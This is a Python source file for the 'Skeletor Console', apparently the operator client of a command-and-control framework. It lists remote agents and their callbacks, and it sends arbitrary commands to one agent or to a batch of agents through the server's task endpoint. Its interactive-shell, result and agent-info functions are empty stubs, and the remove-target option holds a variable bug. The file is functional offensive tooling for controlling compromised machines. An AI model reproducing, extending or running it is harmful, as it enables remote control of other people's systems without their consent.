#!/usr/bin/python3
 
from pathlib import Path
from dotenv import load_dotenv
import os
import requests

load_dotenv()
CURRENT_PATH = Path(__file__).resolve().parent
LOGO_PATH = CURRENT_PATH / "resources" / "logo.txt"
SKELETOR_IP = os.getenv("SKELETOR_IP", "127.0.0.1")
SKELETOR_PORT = os.getenv("SKELETOR_PORT", "80")
SKELETOR_SHELL_HANDLER_ADDR = os.getenv("SKELETOR_SHELL_HANDLER_ADDR","127.0.0.1:9000")
SKELETOR_AUTH_KEY=os.getenv("SKELETOR_AUTH_KEY","")
CUSTOM_HEADERS = {}
if SKELETOR_AUTH_KEY.strip() != "":
    CUSTOM_HEADERS["X-Skeletor-Auth"] = SKELETOR_AUTH_KEY
CURRENT_TARGETS=[]

def init():
    print("Initializing Skeletor Console..."+"\n"*3)
    if LOGO_PATH.exists():
        print(LOGO_PATH.read_text(encoding='utf-8'),end="\n"*4)

def cmd_help():
    menu = {
        "help": "Show this list of commands",
        "agents": "View Skeletor Agents",
        "netinfo": "View Skeletor Server Networking Config",
        "command": "Issue a command to an agent",
        "shell": "Launch an interactive shell",
        "multiexec": "Execute a command on multiple targets",
        "quit": "Exit Skeletor Console"
    }
    print("\nCommands:\n")
    for command, description in menu.items():
        print(f"  {command:12}   {description}")
    print("\n")

def cmd_exit():
    userin = input("Are you sure you want to exit the console? ").strip().lower()
    if userin in ["yes","y"]:
        quit()

def cmd_agents():
    try:
        agents = requests.get(f"http://{SKELETOR_IP}:{SKELETOR_PORT}/get-agents",
        timeout=5,headers=CUSTOM_HEADERS).json()
        output_header = f"\n{'AGENT ID':<16} {'STATUS':<12} {'CALLBACKS':<12} {'LAST SEEN':<22} {'TAGS'}"
        print(output_header)
        print("-" * len(output_header))
        for agent in agents:
            tag_str = ", ".join(agent.get('tags', []))
            print(f"{agent['agent_id']:<16} "
                  f"{agent['status']:<12} "
                  f"{agent['callbacks']:<12} "
                  f"{agent['last_seen']:<22} "
                  f"{tag_str}\n\n")
    except Exception as e:
        print(f"\n{e}\n")

def cmd_netinfo():
    print(f"\nSkeletor Server Address: {SKELETOR_IP}:{SKELETOR_PORT}")
    print(f"Skeletor Shell Handler Address: {SKELETOR_SHELL_HANDLER_ADDR}\n\n")

def cmd_issuecmd():
    agent_id = input("Enter agent ID of target: ").strip()
    command = input("Command to execute: ").strip()
    try:
        data = {'agent_id': agent_id, 'action': 'command', 'input': command}
        requests.post(f"http://{SKELETOR_IP}:{SKELETOR_PORT}/make-task", json=data,headers=CUSTOM_HEADERS)
        print(f"Task created for {agent_id}\n")
    except Exception as e:
        print(f"\n{e}\n")

def cmd_multiexec():
    print("1. View Current Targets")
    print("2. Add Target")
    print("3. Remove Target")
    print("4. Clear Targets")
    print("5. Issue Command to All Targets")
    print("6. Exit multiexec mode")
    while True:
        try:
            userin = input("\n> ").strip().split()
            match userin:
                case ["1"] | ["view"]:
                    for agent in CURRENT_TARGETS: print(agent)
                case ["add", target_id]:
                    CURRENT_TARGETS.append(target_id)
                case ["2"]:
                    newtarget = input("New Target: ").strip()
                    CURRENT_TARGETS.append(newtarget)
                case ["remove", target_id]:
                    if target_id in CURRENT_TARGETS: CURRENT_TARGETS.remove(target_id)
                case ["3"]:
                    toremove = input("Target to remove: ").strip()
                    if target_id in CURRENT_TARGETS: CURRENT_TARGETS.remove(toremove)
                case ["4"] | ["clear"]:
                    CURRENT_TARGETS.clear()
                case ["5"]:
                    command = input("\nCommand to execute: ").strip()
                    print()
                    for agent_id in CURRENT_TARGETS:
                        data = {'agent_id': agent_id, 'action': 'command', 'input': command}
                        requests.post(f"http://{SKELETOR_IP}:{SKELETOR_PORT}/make-task", json=data,headers=CUSTOM_HEADERS)
                        print(f"Task created for {agent_id}")
                    print("\n")
                case ["6"] | ["exit"] | ["quit"] | ["q"]:
                    break
                case _:
                    print("Unrecognized option")
        except KeyboardInterrupt:
            break
        except Exception as e:
            print(f"\n{e}\n")

def cmd_shell():
    pass

def cmd_result():
    pass

def cmd_agentinfo():
    pass

def main():
    commands = {
    "agents": cmd_agents,
    "netinfo": cmd_netinfo,
    "command": cmd_issuecmd,
    "cmd": cmd_issuecmd,
    "multiexec": cmd_multiexec,
    "help": cmd_help,
    "h": cmd_help,
    "exit": cmd_exit,
    "quit": cmd_exit,
    "q": cmd_exit,
    }
    init()
    try:
        while True:
            userin = input("Skeletor > ").strip().lower()
            if not userin:
                continue  
            if userin in commands:
                commands[userin]() 
            else:
                print(f"Unknown command: '{userin}'. Type 'help' for list.")
    except KeyboardInterrupt:
        print()
        cmd_exit()
    except Exception as e:
        print(e)

if __name__ == "__main__":
    main()